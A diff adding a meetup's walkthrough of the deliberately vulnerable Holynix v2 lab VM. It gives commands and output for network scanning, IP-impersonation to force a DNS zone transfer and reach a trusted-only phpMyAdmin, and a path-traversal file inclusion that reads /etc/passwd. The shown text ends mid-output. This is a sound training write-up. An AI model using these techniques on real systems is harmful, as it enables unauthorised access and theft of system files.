@@ -1,0 +1,1394 @@
+.. include:: /pentest_links.txt
+
+.. _Holynix2:
+
+********
+Holynix2
+********
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub Holynix: v2 <https://www.vulnhub.com/entry/holynix-v2,21/>`_:
+
+  Holynix2 is an ubuntu server vmware image that was deliberately built to have security holes for the purposes of penetration testing. More of an obstacle course than a real world example. The object of the challenge is to gain root level privileges and access to personal client information.
+
+Setting up the VMware VM
+------------------------
+
+The VM comes packaged as `holynix-v2.tar.bz2 <http://download.vulnhub.com/holynix/holynix-v2.tar.bz2>`_, which is a tar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of :file:`/etc/shadow`, and delete the root password hash. This will provide passwordless access to holynix2 via root.
+
+See :ref:`VMSetup` for background on using the VMware vmdk file. Holynix2 is Ubuntu 8.04, x86, and 512MB memory. The network interface worked when set to "model=rtl8139" and the MAC address to 00:0C:29:13:21:B3, resulting in the IP hard-coded to 192.168.1.88. Here's how you can create a backing store to undo any changes to the disk:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  VM=holynix2
+  BACKING=$VM.vmdk
+  VM_DISK=$VM-changes.qcow2
+  curl --remote-name http://download.vulnhub.com/holynix/holynix-v2.tar.bz2
+  tar xvfj holynix-v2.tar.bz2
+  cd holynix2
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO qemu-img info $BACKING
+  $SUDO qemu-img info $VM_DISK
+  # To revert to original image
+  # $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+
+Then Linux KVM could use the VM_DISK to create the holynix2 VM. The actual command the author used in Debian Linux to create the VM was:
+
+.. code-block:: bash
+
+  VM=holynix2
+  $SUDO virt-install \
+      --network="bridge=br0,mac=00:0C:29:13:21:B3,model=rtl8139" \
+      --name "$VM" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=ubuntuhardy \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+  #    --console pty,target_type=virtio \
+  # Useful commands:
+  # $SUDO virsh help
+  # $SUDO virsh list --all
+  # $SUDO virsh destroy --graceful $VM
+  # $SUDO virsh start $VM
+  # $SUDO virsh reboot $VM
+  # $SUDO virsh shutdown $VM
+  # $SUDO virsh undefine [--wipe-storage] $VM
+  # $SUDO virsh undefine $VM
+  # $SUDO virsh help destroy
+  # 
+
+So if holynix2 were running and you wanted to "start over again":
+
+.. code-block:: bash
+
+  $SUDO virsh shutdown $VM
+  $SUDO virsh undefine $VM
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO virt-install \
+      --name "$VM" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=ubuntuhardy \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+
+
+Reconnaisance
+=============
+
+Directory setup
+---------------
+
+We'll refer to the following directories below:
+
+.. code-block:: bash
+
+  BASE=$HOME/pentest
+  PT=$BASE/holynix2
+  TOOLS=dns,exploit,files,nmap,passwords,spider,sqlmap
+  eval mkdir -p $PT/{$TOOLS}
+
+Basic network reconnaisance
+---------------------------
+
+Start with some standard network reconnaisance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  cd $PT/nmap
+  NMOUT=nmap
+  SN='192.168.1.0/24'
+  TARGETS=targets.txt
+  $SUDO nmap -sn -PE -oA ${NMOUT}_sn $SN
+  $SUDO chown $USER.$USER ${NMOUT}_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+Running this gives us:
+
+.. code-block:: console
+
+  hacker@kali:~$ SUDO=$(which sudo)
+  hacker@kali:~$ [[ "$USER" == "root" ]] && SUDO=
+  hacker@kali:~$ cd $JOB/nmap
+  hacker@kali:~/pentest/holynix2/nmap$ NMOUT=nmap
+  hacker@kali:~/pentest/holynix2/nmap$ SN='192.168.1.0/24'
+  hacker@kali:~/pentest/holynix2/nmap$ TARGETS=targets.txt
+  hacker@kali:~/pentest/holynix2/nmap$ $SUDO nmap -sn -PE -oA ${NMOUT}_sn $SN
+    ###################### SNIP ######################
+  Nmap scan report for 192.168.1.88
+  Host is up (0.00053s latency).
+  MAC Address: 00:0C:29:13:21:B3 (VMware)
+    ###################### SNIP ######################
+  hacker@kali:~/pentest/holynix2/nmap$ $SUDO chown $USER.$USER ${NMOUT}_sn.*
+  hacker@kali:~/pentest/holynix2/nmap$ # use the grep-able output to get a list of target hosts
+  hacker@kali:~/pentest/holynix2/nmap$ grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  hacker@kali:~/pentest/holynix2/nmap$ # use the xml output to get an html report
+  hacker@kali:~/pentest/holynix2/nmap$ xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+At this point we have $TARGETS so scan them:
+
+.. code-block:: bash
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -iL $TARGETS -oA ${NMOUT}_A
+  $SUDO chown $USER.$USER ${NMOUT}_A.*
+  xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 3,5,8,15,18
+
+  hacker@kali:~/pentest/holynix2/nmap$ $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -iL $TARGETS -oA ${NMOUT}_A
+  ###################### SNIP ######################
+  Discovered open port 80/tcp on 192.168.1.88
+  Discovered open port 21/tcp on 192.168.1.88
+  Discovered open port 53/tcp on 192.168.1.88
+  Discovered open port 22/tcp on 192.168.1.88
+  ###################### SNIP ######################
+  PORT   STATE  SERVICE  VERSION
+  20/tcp closed ftp-data
+  21/tcp open   ftp      Pure-FTPd
+  |_ftp-anon: ERROR: Script execution failed (use -d to debug)
+  |_ftp-bounce: no banner
+  22/tcp open   ssh      OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+  |_ssh-hostkey: 
+  53/tcp open   domain   ISC BIND 9.4.2-P2.1
+  | dns-nsid: 
+  |_  bind.version: 9.4.2-P2.1
+  80/tcp open   http     Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-title: ZincFTP
+  MAC Address: 00:0C:29:13:21:B3 (VMware)
+  Device type: WAP
+  Running: Linux 2.6.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.6
+  OS details: Tomato firmware (Linux 2.6.22)
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/holynix2/nmap$ $SUDO chown $USER.$USER ${NMOUT}_A.*
+  hacker@kali:~/pentest/holynix2/nmap$ xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Our target holynix2 is T=192.168.1.88 and runs the following services:
+
+* port 21:
+
+  Pure-FTPd
+
+* port 22:
+
+  OpenSSH 4.7p1 Debian8ubuntu1.2
+
+* port 53:
+
+  ISC BIND version 9.4.2-P2.1
+
+* port 80:
+
+  Apache 2.2.8, Ubuntu PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
+
+`php5 5.2.4-2ubuntu5.12 (i386 binary) in ubuntu hardy <https://launchpad.net/ubuntu/hardy/i386/php5/5.2.4-2ubuntu5.12>`_ and `openssh 1:4.7p1-8ubuntu1.2 source package in Ubuntu <https://launchpad.net/ubuntu/+source/openssh/1:4.7p1-8ubuntu1.2>`_ point to Ubuntu Hardy (8.04).
+
+Which port to go after: 21, 22, 53, 80?
+---------------------------------------
+
+Ports 21, 22 a userid/password guessing game
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+A quick look-see at the ftp server showed anonymous authentication was not allowed and appeared to be an immediate dead-end. Similarily, ssh server was a guessing game for userid/passwords. The web server was investigated next.
+
+Reconnaisance on port 80
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+dirb
+""""
+
+First scan the web server with :program:`dirb`:
+
+.. code-block:: bash
+
+  T=192.168.1.88
+  cd $PT/spider
+  dirb  http://$T/ -o dirb.txt
+
+The results of the scan were:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/spider$ cat dirb.txt
+
+  -----------------
+  DIRB v2.21    
+  By The Dark Raver
+  -----------------
+
+  OUTPUT_FILE: dirb.txt
+  START_TIME: Thu Jun  4 15:02:30 2015
+  URL_BASE: http://192.168.1.88/
+  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+  -----------------
+
+  GENERATED WORDS: 4592
+
+  ---- Scanning URL: http://192.168.1.88/ ----
+  + http://192.168.1.88/index (CODE:200|SIZE:1205)
+  + http://192.168.1.88/index.php (CODE:200|SIZE:1205)
+  + http://192.168.1.88/phpMyAdmin (CODE:403|SIZE:330)
+  + http://192.168.1.88/register (CODE:200|SIZE:16)
+  + http://192.168.1.88/server-status (CODE:403|SIZE:333)
+
+  -----------------
+  DOWNLOADED: 4592 - FOUND: 5
+
+nikto
+"""""
+
+Next up was a :program:`nikto` scan:
+
+.. code-block:: bash
+
+  T=192.168.1.88
+  cd $PT/spider
+  nikto -output nikto_80.txt -host $T
+
+The results of the scan were:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/spider$ cat nikto_80.txt 
+  - Nikto v2.1.6/2.1.5
+  + Target Host: 192.168.1.88
+  + Target Port: 80
+  + GET Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.12
+  + GET The anti-clickjacking X-Frame-Options header is not present.
+  + GET Uncommon header 'tcn' found, with contents: list
+  + GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+  + HEAD PHP/5.2.4-2ubuntu5.12 appears to be outdated (current is at least 5.4.26)
+  + HEAD Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+  + VYYBKHFF Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+  + OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+  + OSVDB-12184: GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: GET /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: GET /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-3092: GET /register/: This might be interesting...
+  + OSVDB-3268: GET /icons/: Directory indexing found.
+  + GET Server leaks inodes via ETags, header found with file /icons/README, inode: 40753, size: 5108, mtime: Tue Aug 28 03:48:10 2007
+  + OSVDB-3233: GET /icons/README: Apache default file found.
+
+Port 80 analysis
+""""""""""""""""
+
+Looking at the website, there was:
+
+* A registration form.
+
+* phpMyAdmin MySQL administration.
+
+* The home page indicated users had web directories based on their name.
+
+Taking each of these in turn, we start with the registration form. Running the following :program:`sqlmap` query showed no injection vulnerability.
+
+.. code-block:: bash
+
+  T=192.168.1.88
+  cd $PT/sqlmap
+  URL=http://$T/
+  sqlmap -u "$URL" --random-agent --forms --batch \
+    --output-dir $PWD/sqlmap_login --dbs
+
+Trying the phpMyAdmin page resulted in a flat rejection (403) without any redirection to a login page. Either a secret login page or access by something other than userid/password alone.
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/sqlmap$ cd $PT/spider
+  hacker@kali:~/pentest/holynix2/spider$ curl -v http://$T/phpMyAdmin
+  ###################### SNIP ######################
+  ###################### SNIP ######################
+  <title>403 Forbidden</title>
+  </head><body>
+  <h1>Forbidden</h1>
+  <p>You don't have permission to access /phpMyAdmin
+  on this server.</p>
+  ###################### SNIP ######################
+
+Finally, there is the hint DNS would allow harvesting user names:
+
+.. code-block:: console
+  :emphasize-lines: 2-
+
+  hacker@kali:~/pentest/holynix2/spider$ T=192.168.1.88
+  hacker@kali:~/pentest/holynix2/spider$ curl --silent http://$T/ | egrep '(nameservers|directory)'
+  Our nameservers are located at ns1.zincftp.com &amp; ns2.zincftp.com<br />
+  To access your web directory navigate to <b>http://username.zincftp.com</b></div>
+
+So we turn to DNS next.
+
+DNS reconnaisance
+^^^^^^^^^^^^^^^^^
+
+DNS zone transfer
+"""""""""""""""""
+
+So a zone transfer would definitely yield usernames and possibly other useful information. But DNS zone transfers are unsurprisingly restricted:
+
+.. code-block:: console
+  :emphasize-lines: 2,6
+
+  hacker@kali:~/pentest/holynix2/spider$ cd $PT/dns 
+  hacker@kali:~/pentest/holynix2/dns$ dig axfr @$T zincftp.com 
+  ; <<>> DiG 9.9.5-9-Debian <<>> axfr @192.168.1.88 zincftp.com
+  ; (1 server found)
+  ;; global options: +cmd
+  ; Transfer failed.
+
+But there's that nonexistent NS2 @ 192.168.1.89 to impersonate. If there were a real NS2 running we would have to start ``$SUDO arpspoof -t 192.168.1.88 192.168.1.89`` in a separate window in order to impersonate 192.168.1.89. But that isn't needed here as the server wasn't up and running. So we add NS2's address as a secondary and change the routing to $T to use NS2's as the source address:
+
+.. code-block:: bash
+  :emphasize-lines: 1-
+
+  ATTACKER=192.168.1.104
+  NS2=192.168.1.89
+  IF=eth0
+  cd $PT/dns
+  # IPs - attacker and nonexistent secondary nameserver
+  # add NS2 address to interface
+  ip addr show
+  $SUDO ip addr add $NS2/24 dev $IF
+  ip addr show
+  # change routing to use $NS2 as source address to $T
+  ip route show
+  $SUDO ip route add $T/32 dev $IF src $NS2
+  ip route show
+  # now do a DNS AXFR zone transfer - allowed from NS2
+  dig axfr @$T zincftp.com 2>&1 > dns_axfr.txt
+  # undo the the networking changes
+  $SUDO ip route del $T/32
+  ip route show
+  $SUDO ip addr del $NS2 dev $IF
+  ip addr show $IF
+
+Running this gets the axfr zone transer:
+
+.. code-block:: console
+  :emphasize-lines: 1-6,8,10,12-13,15,17,19,21-35,37,38,40
+
+  hacker@kali:~/pentest/holynix2/dns$ ATTACKER=192.168.1.104
+  hacker@kali:~/pentest/holynix2/dns$ NS2=192.168.1.89
+  hacker@kali:~/pentest/holynix2/dns$ IF=eth0
+  hacker@kali:~/pentest/holynix2/dns$ cd $PT/dns
+  hacker@kali:~/pentest/holynix2/dns$ # add NS2 address to interface
+  hacker@kali:~/pentest/holynix2/dns$ ip addr show
+  ###################### SNIP ######################
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+  ###################### SNIP ######################
+      inet 192.168.1.106/24 brd 192.168.1.255 scope global eth0
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/holynix2/users$ $SUDO ip addr add $NS2/24 dev $IF
+  hacker@kali:~/pentest/holynix2/users$ ip addr show
+  ###################### SNIP ######################
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+  ###################### SNIP ######################
+      inet 192.168.1.106/24 brd 192.168.1.255 scope global eth0
+  ###################### SNIP ######################
+      inet 192.168.1.89/24 scope global secondary eth0
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/holynix2/dns$ # change routing to use $NS2 as source address to $T
+  hacker@kali:~/pentest/holynix2/dns$ ip route show
+  default via 192.168.1.1 dev eth0 
+  192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.106 
+  hacker@kali:~/pentest/holynix2/dns$ $SUDO ip route add $T/32 dev $IF src $NS2
+  hacker@kali:~/pentest/holynix2/dns$ ip route show
+  default via 192.168.1.1 dev eth0 
+  192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.106 
+  192.168.1.88 dev eth0  scope link  src 192.168.1.89 
+  hacker@kali:~/pentest/holynix2/dns$ dig axfr @$T zincftp.com 2>&1 > dns_axfr.txt
+  hacker@kali:~/pentest/holynix2/dns$ $SUDO ip route del $T/32
+  hacker@kali:~/pentest/holynix2/dns$ ip route show
+  default via 192.168.1.1 dev eth0 
+  192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.106 
+  hacker@kali:~/pentest/holynix2/dns$ $SUDO ip addr del $NS2 dev $IF
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/holynix2/dns$ ip addr show $IF
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+  ###################### SNIP ######################
+      inet 192.168.1.106/24 brd 192.168.1.255 scope global eth0
+  ###################### SNIP ######################
+
+What's in the DNS zone?
+"""""""""""""""""""""""
+
+Here's the axfr file:
+
+.. code-block:: bash
+
+  cd $PT/dns
+  cat dns_axfr.txt
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 1,3,6-10,21,35,37-38,45-47
+
+  hacker@kali:~/pentest/holynix2/dns$ cat dns_axfr.txt
+
+  ; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> axfr @192.168.1.88 zincftp.com
+  ; (1 server found)
+  ;; global options: +cmd
+  zincftp.com.		38400	IN	SOA	ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
+  zincftp.com.		38400	IN	NS	ns1.zincftp.com.
+  zincftp.com.		38400	IN	NS	ns2.zincftp.com.
+  zincftp.com.		38400	IN	MX	10 mta.zincftp.com.
+  zincftp.com.		38400	IN	A	192.168.1.88
+  ahuxley.zincftp.com.	38400	IN	A	192.168.1.88
+  amckinley.zincftp.com.	38400	IN	A	192.168.1.88
+  bzimmerman.zincftp.com.	38400	IN	A	192.168.1.88
+  cbergey.zincftp.com.	38400	IN	A	192.168.1.88
+  cfinnerly.zincftp.com.	38400	IN	A	192.168.1.88
+  cjalong.zincftp.com.	38400	IN	A	192.168.1.88
+  cmahong.zincftp.com.	38400	IN	A	192.168.1.88
+  cmanson.zincftp.com.	38400	IN	A	192.168.1.88
+  ddonnovan.zincftp.com.	38400	IN	A	192.168.1.88
+  ddypsky.zincftp.com.	38400	IN	A	192.168.1.88
+  dev.zincftp.com.	38400	IN	A	192.168.1.88
+  dhammond.zincftp.com.	38400	IN	A	192.168.1.88
+  dmoran.zincftp.com.	38400	IN	A	192.168.1.88
+  dsummers.zincftp.com.	38400	IN	A	192.168.1.88
+  evorhees.zincftp.com.	38400	IN	A	192.168.1.88
+  gwelch.zincftp.com.	38400	IN	A	192.168.1.88
+  hmcknight.zincftp.com.	38400	IN	A	192.168.1.88
+  jgacy.zincftp.com.	38400	IN	A	192.168.1.88
+  jsmith.zincftp.com.	38400	IN	A	192.168.1.88
+  jstreet.zincftp.com.	38400	IN	A	192.168.1.88
+  kmccallum.zincftp.com.	38400	IN	A	192.168.1.88
+  lnickerbacher.zincftp.com. 38400 IN	A	192.168.1.88
+  lsanderson.zincftp.com.	38400	IN	A	192.168.1.88
+  lwestre.zincftp.com.	38400	IN	A	192.168.1.88
+  mta.zincftp.com.	38400	IN	A	10.0.192.48
+  ncobol.zincftp.com.	38400	IN	A	192.168.1.88
+  ns1.zincftp.com.	38400	IN	A	192.168.1.88
+  ns2.zincftp.com.	38400	IN	A	192.168.1.89
+  rcropper.zincftp.com.	38400	IN	A	192.168.1.88
+  rfrost.zincftp.com.	38400	IN	A	192.168.1.88
+  rwoo.zincftp.com.	38400	IN	A	192.168.1.88
+  skrymple.zincftp.com.	38400	IN	A	192.168.1.88
+  splath.zincftp.com.	38400	IN	A	192.168.1.88
+  tmartin.zincftp.com.	38400	IN	A	192.168.1.88
+  trusted.zincftp.com.	38400	IN	A	192.168.1.34
+  www.zincftp.com.	38400	IN	A	192.168.1.88
+  zincftp.com.		38400	IN	SOA	ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
+  ;; Query time: 2 msec
+  ;; SERVER: 192.168.1.88#53(192.168.1.88)
+  ;; WHEN: Sat Jun  6 12:59:27 2015
+  ;; XFR size: 42 records (messages 1, bytes 1021)
+
+Three items stand out:
+
+* FTP user names (30 of them)
+  These would be useful if we wished to do some password cracking. However, online password cracking is notoriously slow for FTP and SSH. We'll ignore those names for now.
+
+* dev.zincftp.com
+  Maybe for a development server, so we will ignore for now.
+
+* trusted.zincftp.com (192.168.1.34)
+  This one looks interesting and impersonating it like NS2 above will be tried.
+
+* mta.zincftp.com (10.0.192.48)
+  Since we won't set up an email server we will ignore for now.
+
+Impersonating trusted.zincftp.com
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+trusted.zincftp.com can access phpMyAdmin
+"""""""""""""""""""""""""""""""""""""""""
+
+Note - if trusted.zincftp.com is actually running you would have to start ``arpspoof -t 192.168.1.88 192.168.1.34`` to allow the IP impersonation. Also, be sure to use the DNS from $T (probably setting up **nameserver 192.168.1.88** in :file:`/etc/resolv.conf`). Here goes the impersonation without the ``arpspoof``:
+
+.. code-block:: bash
+
+  IF=eth0
+  ATTACKER=192.168.1.104
+  T=192.168.1.88
+  TRUSTED=192.168.1.34
+  cd $PT/exploit
+  # add NS2 address to interface
+  ip addr show
+  $SUDO ip addr add $TRUSTED/24 dev $IF
+  ip addr show
+  # change routing to use $TRUSTED as source address to $T
+  ip route show
+  $SUDO ip route add $T/32 dev $IF src $TRUSTED
+  ip route show
+  # now try access - allowed from TRUSTED
+  curl --silent http://$T/phpMyAdmin/
+
+Running this gives:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/dns$ IF=eth0
+  hacker@kali:~/pentest/holynix2/dns$ ATTACKER=192.168.1.104
+  hacker@kali:~/pentest/holynix2/dns$ T=192.168.1.88
+  hacker@kali:~/pentest/holynix2/dns$ TRUSTED=192.168.1.34
+  hacker@kali:~/pentest/holynix2/dns$ cd $PT/exploit
+  hacker@kali:~/pentest/holynix2/exploit$ # add NS2 address to interface
+  hacker@kali:~/pentest/holynix2/exploit$ ip addr show
+  ###################### SNIP ######################
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+  ###################### SNIP ######################
+      inet 192.168.1.104/24 brd 192.168.1.255 scope global eth0
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/holynix2/exploit$ $SUDO ip addr add $TRUSTED/24 dev $IF
+  hacker@kali:~/pentest/holynix2/exploit$ ip addr show
+  ###################### SNIP ######################
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+  ###################### SNIP ######################
+      inet 192.168.1.106/24 brd 192.168.1.255 scope global eth0
+         valid_lft forever preferred_lft forever
+      inet 192.168.1.34/24 scope global secondary eth0
+         valid_lft forever preferred_lft forever
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/holynix2/exploit$ $SUDO ip route add $T/32 dev $IF src $TRUSTED
+  hacker@kali:~/pentest/holynix2/exploit$ ip route show
+  default via 192.168.1.1 dev eth0 
+  192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.106 
+  192.168.1.88 dev eth0  scope link  src 192.168.1.34 
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/holynix2/exploit$ curl http://$T/phpMyAdmin/
+  ###################### SNIP ######################
+  <title>phpMyAdmin  - 192.168.1.88</title>
+  ###################### SNIP ######################
+  </html>
+
+So impersonating TRUSTED allows passwordless access to the phpMyAdmin web page and allows us to create no end of mischief on holynix2.
+
+Rerunning nikto as trusted.zincftp.com
+""""""""""""""""""""""""""""""""""""""
+
+.. code-block:: bash
+
+  cd $PT/spider
+  nikto -output nikto_trusted.txt -host $T
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 2,31
+
+  hacker@kali:~/pentest/holynix2/exploit$ cd $PT/spider
+  hacker@kali:~/pentest/holynix2/spider$ nikto -output nikto_trusted.txt -host $T
+  - Nikto v2.1.6
+  ---------------------------------------------------------------------------
+  + Target IP:          192.168.1.88
+  + Target Hostname:    192.168.1.88
+  + Target Port:        80
+  + Start Time:         2015-06-08 18:29:11 (GMT-7)
+  ---------------------------------------------------------------------------
+  + Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
+  + Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.12
+  + The anti-clickjacking X-Frame-Options header is not present.
+  + No CGI Directories found (use '-C all' to force check all possible dirs)
+  + PHP/5.2.4-2ubuntu5.12 appears to be outdated (current is at least 5.4.26)
+  + Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+  + Uncommon header 'tcn' found, with contents: list
+  + Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+  + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+  + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+  + Uncommon header 'x-ob_mode' found, with contents: 1
+  + OSVDB-8450: /phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. http://www.securityfocus.com/bid/7963.
+  + OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+  + Cookie pma_theme created without the httponly flag
+  + Cookie pma_collation_connection created without the httponly flag
+  + OSVDB-3092: /phpMyAdmin/: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+  + OSVDB-3092: /register/: This might be interesting...
+  + OSVDB-3268: /icons/: Directory indexing found.
+  + /phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00: PHP include error may indicate local or remote file inclusion is possible.
+  + Server leaks inodes via ETags, header found with file /icons/README, inode: 40753, size: 5108, mtime: Tue Aug 28 03:48:10 2007
+  + OSVDB-3233: /icons/README: Apache default file found.
+  + /phpMyAdmin/: phpMyAdmin directory found
+  + 6603 requests: 0 error(s) and 23 item(s) reported on remote host
+  + End Time:           2015-06-08 18:30:27 (GMT-7) (76 seconds)
+  ---------------------------------------------------------------------------
+  + 1 host(s) tested
+
+phpMyAdmin file inclusion vulnerability
+"""""""""""""""""""""""""""""""""""""""
+
+A search for nikto's report text "remote file inclusion" led to nmap's `http-phpmyadmin-dir-traversal <https://nmap.org/nsedoc/scripts/http-phpmyadmin-dir-traversal.html>`_:
+
+.. code-block:: bash
+
+  cd $PT/passwords
+  FILE="/etc/passwd"
+  FILEPATH="../../../../..$FILE"
+  OUTFILE=passwd.txt
+  nmap -p80 --script http-phpmyadmin-dir-traversal \
+       --script-args="dir='/phpMyAdmin/',file='$FILEPATH',outfile='$OUTFILE'" \
+       $T
+
+Running this gives us:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/holynix2/spider$ cd $PT/passwords
+  hacker@kali:~/pentest/holynix2/passwords$ FILE="/etc/passwd"
+  hacker@kali:~/pentest/holynix2/passwords$ FILEPATH="../../../../..$FILE"
+  hacker@kali:~/pentest/holynix2/passwords$ OUTFILE=passwd.txt
+  hacker@kali:~/pentest/holynix2/passwords$ nmap -p80 --script http-phpmyadmin-dir-traversal \
+  >      --script-args="dir='/phpMyAdmin/',file='$FILEPATH',outfile='$OUTFILE'" \
+  >      $T
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-08 19:35 PDT
+  Nmap scan report for 192.168.1.88
+  Host is up (0.0014s latency).
+  PORT   STATE SERVICE
+  80/tcp open  http
+  | http-phpmyadmin-dir-traversal: 
+  |   VULNERABLE:
+  |   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
+  |     State: VULNERABLE (Exploitable)
+  |     IDs:  CVE:CVE-2005-3299
+  |     Description:
+  |       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
+  |       
+  |     Disclosure date: 2005-10-nil
+  |     Extra information:
+  |       ../../../../../etc/passwd :
+  |   root:x:0:0:root:/root:/bin/bash
+  |   daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+  |   bin:x:2:2:bin:/bin:/bin/sh
+  |   sys:x:3:3:sys:/dev:/bin/sh
+  |   sync:x:4:65534:sync:/bin:/bin/sync
+  |   games:x:5:60:games:/usr/games:/bin/sh
+  |   man:x:6:12:man:/var/cache/man:/bin/sh
+  |   lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+  |   mail:x:8:8:mail:/var/mail:/bin/sh
+  |   news:x:9:9:news:/var/spool/news:/bin/sh
+  |   uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
